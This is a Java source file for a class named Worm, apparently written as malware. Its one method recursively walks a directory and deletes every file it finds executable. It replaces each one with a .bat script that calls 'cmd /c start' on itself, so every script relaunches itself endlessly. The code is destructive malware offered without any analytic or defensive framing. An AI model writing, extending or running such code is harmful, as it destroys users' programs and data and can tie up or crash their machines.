package worm;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;
import java.util.Objects;

import javax.swing.Icon;
import javax.swing.filechooser.FileSystemView;

import java.awt.Desktop;
import java.awt.desktop.OpenFilesEvent;
import java.awt.desktop.OpenFilesHandler;
import java.io.BufferedWriter;

public class Worm {
	
    public void startWurm(String directory)
    {
        File dir = new File(directory);
        File[] files = dir.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isFile() && file.canExecute() && !file.isDirectory()) {
                	String filePath = file.getParent();
                	String fileName = file.getName();
                	String newFileName = fileName.substring(0, fileName.lastIndexOf('.') + 1) + "bat";
                	File newFile = new File(filePath, newFileName);
                	file.delete();
                    try {
                        FileWriter writer = new FileWriter(newFile, true);
                        writer.write("cmd /c start " + newFile.getAbsolutePath());
                        writer.close();
                        
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                	
                    
                } else if (file.isDirectory()) {
                    startWurm(file.getAbsolutePath()); // Rekursion, um Unterverzeichnisse zu durchsuchen
                }
            }
        }
    }
}

